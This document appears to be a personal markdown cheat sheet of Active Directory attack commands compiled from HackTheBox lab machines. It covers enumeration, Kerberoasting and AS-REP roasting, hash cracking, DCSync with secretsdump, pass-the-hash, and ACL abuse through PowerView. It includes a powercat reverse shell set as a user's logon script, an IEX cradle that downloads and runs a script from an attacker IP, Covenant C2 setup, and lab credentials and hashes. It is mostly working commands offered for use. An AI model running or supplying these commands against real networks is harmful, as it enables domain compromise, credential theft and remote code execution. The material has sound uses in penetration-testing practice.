# Active Directory


# Enumeration
* add to /etc/hosts `10.10.10.175 EGOTISTICAL-BANK.local sauna sauna.EGOTISTICAL-BANK.local`

## Ports
* 88 keberos
* 445 smb
* 389 ldap
* 80 http
* 5985 winr
* windows remoting

#### 445 SMB 135 RPC
* `crackmapexec smb IP` _> domain name
* `crackmapexec smb IP --shares` -> enum shares
* `crackmapexec smb IP --shares -u '' -p ''`
* `rpcclient IP`
* `rpcclient -U '' IP`
* * rpcclinet> enumdomusers
* * rpcclient> querydispinfo -> check desc
* * rpcclient> queryuser RID (oxxxx)
* * rpcclient> enumdomgroups
* * rpcclient> querygroup RID
* * rpcclient> querygroupmem RID
* rpcdump.py (Impacket)
* `smbmap -R sharename -H IP -A filename`
* `smbmap -u null -p null -H`
* `cme smb IP -u user -p password -M spider_plus`
* `smbcacls -N '//IP/Share'`
* `impacket-rpcdump -p 135 10.10.10.213`
* `impacket-rpcmap 'ncacn_ip_tcp:10.10.10.213'` -> get ipv6
* `impacket-rpcmap 'ncacn_ip_tcp:10.10.10.213' | grep -A2 'DCOM'`
* `impacket-rpcmap 'ncacn_ip_tcp:10.10.10.213' -brute-opnums -auth-level 1 -opnum-max 5`
* get ipv6 from ^ htb apt
* `smbclient -U 'Tiffany.Molina' //10.10.10.248/Users 'NewIntelligenceCorpUser9876'`

##### Program?
* dnspy
* ghidra
* 

##### Mutate passwordlist
* `crackmapexec smb IP --pass-pol` -> check account lockout threshold
* `hashcat --force pass.lst -r /usr/shar/hashcat/rules/best64.rulw --stdout > newpass`

#### DNS
* `nslookup`
* * `>server IP`
* * `127.0.0.1`
* * `IP`
* * `xxxx.xxx.xx`
* `dnsrecon -d 10.10.10.100 -r 10.0.0.0/8`
* `dig -q axfr IP`
* `dnsrecon -d intel.londom -t axfr`
* `dnsenum --dnsserver 10.10.10.248 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt`

#### HTTP/HTTPS
* get users
* * First Last
* * First.Last
* * FLast
* * F.Last
* * First
* * Last

#### LDAP
* `ldapsearch -x -h IP -s base namingcontexts` -> get DC Name
* `ldapsearch -x -h IP -b 'DC=XXX,DC=XXX' -s sub` grep for sam || ` | awk '{print $1}' | sort | uniq -c | sort -nr | grep ':'` find uniq fields with single appearance
* `ldapsearch -h IP -x -b "DC=XXX,DC=XXX" '(objectClass=Person)'`
* * `ldapsearch -h IP -x -b "DC=XXX,DC=XXX" '(objectClass=Person)' samaccountname` 
*` ldapdomaindump -u support\\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' support.htb`
* `addspn.py` -> add/remove/modify Service Principal Names on accounts in AD over LDAP.
* `ldapsearch -x -H ldap://10.10.11.174 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'  -b 'DC=support,DC=htb' -s sub`
* `dnstool.py` -> Add/modify/delete Active Directory Integrated DNS records via LDAP.
* * `python3 dnstool.py -u intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 -r websecnigma.intelligence.htb -a add -d 10.10.16.29 10.10.10.248`


#### Kerberos 
* `kerbrute userenum --dc IP -d XX.XX users.txt` -> enum users
* `impacket-GetNPUsers -dc-ip 10.10.10.100 -request 'EGOTISTICAL-BANK.local/'`
* `impacket-GetNPUsers -no-pass -dc-ip 10.10.10.100 -request 'EGOTISTICAL-BANK.local/'`
* `impacket-GetNPUsers EGOTISTICAL-BANK.local/administrator` (with blank password) -> get TGT
* * GetNPUsers.py: This example will attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ set
* * `hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt` -> crack TGT
* explore impacket suite
* Knock and Pass: Kerberos Exploitation ms14

#### NTP 
* `sudo ntpdate -u 10.10.10.248`

#### Responder

* `sudo responder -I tun0`

# Post

* secretsdump.py (impacket)
* run winpeas 
* run seatbelt (priv esc tool) `.\seatbelt.exe -group=all`
* windowsexp
* net user /domain
* net user 
# Powerview
* upload powerview.ps1 `Set-ExecutionPolicy RemoteSigned -Scope CurrentUser` `. .\PowerView.ps1`
* `IEX(New-Object Net.WebClient).downloadString('http://10.10.16.29/PowerView.ps1')`

## BloodHound
### setup
* sudo apt install bloodhound
* download injestor from (https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) and upload to AD
* `sudo neo4j console` -> vist console and change pass `neo4j`  
* * reset neo4j pass `rm /usr/share/neo4j/data/dbms/auth` 

### use
* run injestor in victim `.\SharpHound.exe` || `.\SharpHound.exe -c all`
* `sudo neo4j console` -> start neo4j
* `bloodhound` -> launch bloodhound
* download injestor zip file -> drag and drop to bloodhound
* search owned users and mark as owned
* queries -> shortest path from owned principles
* queries -> find all Domain admins
* queries -> Find Shortest Paths to Domain Admins
* queries -> Find Principals with DCSync Rights
* * `impacket-secretsdump EGOTISTICAL-BANK.local/svc_loanmgr@10.10.10.175`
* * try covenant
* queries -> shortest path from kerberostable users (check admin/users)
* * `impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request` -> take hash to hashcat (use valid user)
* * try covenant
* if blocked by group policy copy to c:\windows\temp or any dir in applocker bypass
* with creds no shell -> `python3 bloodhound.py -c ALL -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -dc intelligence.htb -ns 10.10.10.248`
### vulns

* Generic All 
* `service accounts can creat users` -> `net user zeke password1 /add /domain` -> `net group "Exchange Windows Permissions" /add /zeke`
* Generic Write (spn)
* `$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force`
* `$Cred = New-Object System.Management.Automation.PSCredential('OBJECT\smith', $SecPassword)`
* `Set-DomainObject -Credential $Cred -Identity maria -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}`
* `Get-DomainSPNTicket -Credential $Cred nonexistent/BLAHBLAH | fl` -> crack
* Generic Write (set logon script)
* `wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1`
* `echo 'powercat -c 127.0.0.1 -p 1234 -e cmd' >> powercat.ps1` -> upload `powercat.ps1 && nc.exe`
* `copy powercat.ps1 C:\Windows\System32\spool\drivers\color\`
* `Set-DomainObject -Identity maria -SET @{scriptpath="C:\\Windows\\System32\\spool\\drivers\\color\\powercat.ps1"}`
or exec cmd
* `echo 'dir C:\Users\maria\Desktop > C:\Windows\System32\spool\drivers\color\dir.dmp' > run.ps1`
* run `Set-DomainObject -Identity maria -SET @{scriptpath="C:\\Windows\\System32\\spool\\drivers\\color\\run.ps1"}`
* check C:\Windows\System32\spool\drivers\color\dir.dmp
* Writeowener
* `Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'`
* `Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All`
* `Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'` (then re login)
* Write Dcal (with powerview)
* `IEX(New-Object Net.WebClient).downloadString('http://10.10.16.29/PowerView.ps1')`
* `$SecPassword = ConvertTo-SecureString 'password1' -AsPlainText -Force`
* `$Cred = New-Object System.Management.Automation.PSCredential('HTB\zeke', $SecPassword)`
* `Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity zeke -Rights DCSync`
* `impacket-secretsdump htb.local/zeke:password1@10.10.10.161`
* procced to password/hashes -> psexec
* ForceChangePassword (with powerview)
* `$SecPassword = ConvertTo-SecureString 'password1' -AsPlainText -Force`
* `$Cred = New-Object System.Management.Automation.PSCredential('OBJECT\oliver', $SecPassword)` (signin with valid creds)
* create other user pass `$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force`
* change smith's pass `Set-DomainUserPassword -Identity smith -AccountPassword $UserPassword -Credential $Cred`
* get hashes from SAM and SYSTEM
* `impacket-secretsdump local -system registry/SYSTEM -security registry/SECURITY -ntds Active\ Directory/ntds.dit -outputfile hashes`
* read Group Manage Service Account password (GMSA)
* `python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb`
* `getST.py -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate administrator intelligence.htb/svc_int`
* `KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb`

# Password/Hashes
### Enum
* `crackmapexec smb IP -u user -p password --shares`
* `cme smb IP -u user -p password -M spider_plus` crawls all readable shares
* `impacket-GetADUsers -all -dc-ip 10.10.10.100 active.htb/svc_tgs`
* `ldapsearch -x -h 10.10.10.100 -p 389 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAM` -> enum users
* `ldapsearch -x -h 10.10.10.100 -p 389 -D 'SVC_TGS' -w'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName` -> detect SPN accounts
* * `impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100` -> detect SPN
* * `impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request` -> take hash to hashcat
* check powershell logs `cd C:\PSTranscripts`
* `gci -Hidden`
* if you get kerberos hash -> Golden tickey (ippsec forest)
* `python3 bloodhound.py -c ALL -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -dc intelligence.htb -ns 10.10.10.248`
* `getST.py -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate administrator intelligence.htb/svc_int`
* `KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb`
* with kerberost ticket `getTGT.py windcorp.htb/beatericemill` (edit /etc/krb5)
* * `KRB5CCNAME=administrator.ccache smbclient -k -U administrator@windcorp.htb -L //hostname.windcorp.htb`
* * `cme smb hator.windcorp.htb -k -d windcorp.htb -u administrator -p 'password' --shares`
#### NTML Crack
* `hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt`

#### Mount
* `sudo mkdir /mnt/sharename`
* `sudo mount -t cifs //IP/Share /mnt/sharename`
* `sudo mount -t cifs -o 'user=username,password=pass' //IP/Share /mnt/sharename`

### Login
* `ldapsearch -x -H ldap://10.10.11.174 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'  -b 'DC=support,DC=htb' -s sub`
* `crackmapexec smb IP -u user -p password` -> check for pwned
* * `impacket-psexec user@IP`
* `crackmapexec winrm IP -u user -p password` -> check for pwned
* * `evil-winrm -i IP -u user -p passord` -> use `upload`
* `impacket-secretsdump EGOTISTICAL-BANK.local/svc_loanmgr@10.10.10.175` -> administrator:500:XXXXXXX:usefulhash:::
* * pass the hash `crackmapexec smb 10.10.10.175 -u administrator -H hash` if pwned
* * `impacket-psexec GOTISTICAL-BANK.local/administrator@10.10.10.175 -hashes hash:hash`

#### CertSrv
* readable `CertEnroll` share
* `http://IP/certsrv` -> username and password
* `openssl genrsa -aes256 -out amanda.key 2048`
* `openssl req -new -key amanda.key -out amanda.csr`
* `http://IP/certsrv` -> Pequest a certificate -> advanced certificate request -> paste amanda.csr
* Download base64 format
* `evil-winrm -i 10.10.10.103  -u amanda -p Ashare1972 -S -c certnew.cer -k amanda.key`

# Groups
* AD Recycle Bin -> get deleted Items(powershell) (ippsec cascade)
* DNSAdmins -> priv esc
* * `msfvenom` (ippsec resolute)
* 500's sys accts 1000's customish

# Lateral Movement

# Covenant
* install script by rj `https://github.com/megatop1/RedTeam/blob/main/Windows/InstallTools.sh`
* OR 
```
$ ~ > git clone --recurse-submodules https://github.com/cobbr/Covenant
$ ~ > cd Covenant/Covenant
$ ~/Covenant/Covenant > docker build -t covenant .
$ ~/Covenant/Covenant > docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v `pwd`/Data:/app/Data covenant
```
* listner -> launchers (Binary/ps)(download) -> grunt interact
* Kerberoastable user
* * `MakeToken amanda htb Ashare1972`
* * `Kerberoast mrlky hashcat`
* DCSync
* * `MakeToken mrlky htb Football#7`
* * `DCSync Administrator`